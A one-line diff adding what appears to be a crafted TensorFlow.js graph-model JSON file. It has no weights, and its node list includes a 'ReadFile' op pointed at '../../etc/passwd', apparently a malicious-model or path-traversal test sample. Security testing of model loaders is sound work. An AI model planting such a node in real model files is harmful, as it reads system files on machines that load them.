@@ -1,0 +1,1 @@
+{"format":"graph-model","generatedBy":"1.0","weightsManifest":[{"paths":["group1-shard1of1.bin"],"weights":[]}],"modelTopology":{"node":[{"name":"n1","op":"FlexAdd"},{"name":"rf","op":"ReadFile","attr":{"filename":{"s":"../../etc/passwd"}}}]}}
